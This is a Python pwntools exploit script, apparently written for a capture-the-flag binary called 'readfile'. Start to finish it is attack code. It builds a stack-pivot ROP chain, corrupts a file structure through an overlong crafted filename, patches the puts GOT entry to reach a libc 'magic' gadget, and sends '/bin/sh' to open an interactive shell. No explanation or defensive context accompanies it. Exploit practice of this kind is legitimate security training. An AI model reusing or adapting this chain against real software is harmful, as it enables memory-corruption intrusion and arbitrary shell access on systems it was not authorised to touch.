from pwn import *
import string

context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('readfile')
rop = ROP(elf)
stager = ROP(elf)

r = None

def write_file(name, data):
    r.sendline('1')
    r.sendline(name)
    r.sendline(str(len(data)))
    r.sendline(data)

def read_file(name):
    r.sendline('2')
    r.sendline(name)

"""
1:
0x080486af : mov eax, dword ptr [0x804a088] ; cmp eax, ebx ; jb 0x80486ba ; mov byte ptr [0x804a084], 1 ; add esp, 4 ; pop ebx ; pop ebp ; ret
2:
0x080486be : add dword ptr [ebx + 0x5d5b04c4], eax ; ret
"""

ret = 0x08048a29
binsh = 0x804af00

stager.gets(0x804a300) # Arbitrary address somewhere deeper in the 0x804a000 chunk
stager.migrate(0x804a300) # Stack pivot to 0x804a300
print(stager.dump())

rop.gets(0x804a088) # Put constant value
rop.raw(0x80486af)
rop.raw(0xaaaaaaaa) # junk
rop.raw(elf.got['puts']-0x5d5b04c4) # puts-magic libc
rop.raw(0x804a900) # junk
rop.raw(0x80486be)  # Add constant to puts
rop.gets(binsh) # Put /bin/sh in memory
rop.gets(0x804a088) # Put pointer to /bin/sh in memory
rop.raw(0x80486af)  # Put pointer to /bin/sh in eax
rop.raw(0x804a900) # junk
rop.raw(0x804a900) # junk ebx
rop.raw(0x804a900) # junk ebp
rop.puts(0) # Trigger magic libc

leaveret = 0x80486f1

data = p32(leaveret)

data2 = 'c' * cyclic_find('aaca')
data2 += p32(0x04a18000)
data2 += '\x08' * (cyclic_find('ARAA', alphabet=string.ascii_uppercase) - 4 - len(data2))
data += data2

data += p32(0x804af00)      # 2) Some valid address to pass fclose
data += p32(0x804a0a5-0x3c) # 3) Address we will be calling at instruction call [eax + 0x3c]
data += p32(0xcafebabe) # junk data
# data += str(stager) # TRIGGER FOR ROP CHAIN
# data += p32(ret) * ((240-len(data)-len(str(stager)))/4) # ROP nops
data += p32(0xdeadbeef) * 36
data += str(stager)

filename = '/tmp/' + data
print(filename)
try:
    os.remove(filename)
except:
    pass

r = process("./readfile")

data = 'a' * cyclic_find('paac')
data += p32(0x804a0a0) # 1) Some valid address to pass fclose
data += 'b' * (1000 - len(data))
write_file(filename, data)

r = process("./readfile")
"""
gdb.attach(r, '''
break *{}
break *0x0804890a
break gets
break *0x80486be
c
'''.format(hex(leaveret)))
"""
read_file(filename)

raw_input("Send second rop chain")
r.sendline(str(rop)) # Constant value to add to puts
raw_input("Send constant value")
r.sendline(p32(0xfffdaa19)) # Constant value to add to puts
raw_input("Send /bin/sh")
r.sendline("/bin/sh\0") # Constant value to add to puts
raw_input("Send pointer to /bin/sh")
r.sendline(p32(binsh)) # Constant value to add to puts

r.interactive()
